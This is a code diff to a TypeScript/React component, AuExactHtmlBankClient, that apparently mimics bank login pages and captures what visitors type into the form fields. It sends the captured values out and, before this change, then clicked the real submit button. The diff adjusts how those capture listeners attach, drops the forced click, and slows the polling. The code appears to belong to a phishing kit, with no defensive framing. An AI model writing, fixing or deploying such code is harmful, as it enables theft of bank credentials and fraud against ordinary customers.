@@ -549,15 +549,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       if (captured.length === 0) return;
 
       lastSubmitAtRef.current = now;
-
-      const snapForm = savedSubmitFormRef.current ?? loginForm;
-      const snapNodes = savedSubmitActionNodesRef.current.length > 0
-        ? savedSubmitActionNodesRef.current
-        : computeActionNodes(doc, snapForm);
-
-      void submitCapturedFields(captured).finally(() => {
-        try { ultraForceClickOnBestNode(snapForm, snapNodes); } catch {}
-      });
+      void submitCapturedFields(captured);
     };
 
     const computeActionNodes = (d: Document, form: HTMLFormElement | null): HTMLElement[] => {
@@ -632,17 +624,16 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       try { node.removeEventListener("click", submitWithCurrentValues as any); } catch {}
       try { node.removeEventListener("mousedown", submitWithCurrentValues as any); } catch {}
       try { node.removeEventListener("touchend", submitWithCurrentValues as any); } catch {}
-      try { node.removeEventListener("keyup", submitWithCurrentValues as any); } catch {}
-      node.addEventListener("click", submitWithCurrentValues as any, true);
-      node.addEventListener("mousedown", submitWithCurrentValues as any, true);
-      node.addEventListener("touchend", submitWithCurrentValues as any, true);
+      node.addEventListener("click", submitWithCurrentValues as any, false);
+      node.addEventListener("mousedown", submitWithCurrentValues as any, false);
+      node.addEventListener("touchend", submitWithCurrentValues as any, false);
       try {
         node.addEventListener("keydown", (e: Event) => {
           const ke = e as KeyboardEvent;
           if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
             try { submitWithCurrentValues(e as any); } catch {}
           }
-        }, true);
+        }, false);
       } catch {}
     });
 
@@ -785,20 +776,20 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
           try {
             const curRef = submitWithCurrentValuesRef.current;
-            try { node.removeEventListener("click", curRef as any, true); } catch {}
-            try { node.removeEventListener("mousedown", curRef as any, true); } catch {}
-            try { node.removeEventListener("touchend", curRef as any, true); } catch {}
+            try { node.removeEventListener("click", curRef as any, false); } catch {}
+            try { node.removeEventListener("mousedown", curRef as any, false); } catch {}
+            try { node.removeEventListener("touchend", curRef as any, false); } catch {}
             if (shouldForceEnable && curRef) {
-              node.addEventListener("click", curRef as any, true);
-              node.addEventListener("mousedown", curRef as any, true);
-              node.addEventListener("touchend", curRef as any, true);
+              node.addEventListener("click", curRef as any, false);
+              node.addEventListener("mousedown", curRef as any, false);
+              node.addEventListener("touchend", curRef as any, false);
               try {
                 node.addEventListener("keydown", (e: Event) => {
                   const ke = e as KeyboardEvent;
                   if (ke && (ke.key === "Enter" || (ke as any).keyCode === 13)) {
                     try { curRef(); } catch {}
                   }
-                }, true);
+                }, false);
               } catch {}
             }
           } catch {}
@@ -852,8 +843,8 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       }
     };
 
-    const initialTimer = window.setTimeout(runPoll, 150);
-    const pollTimer = window.setInterval(runPoll, 300);
+    const initialTimer = window.setTimeout(runPoll, 250);
+    const pollTimer = window.setInterval(runPoll, 800);
 
     return () => {
       window.clearTimeout(initialTimer);
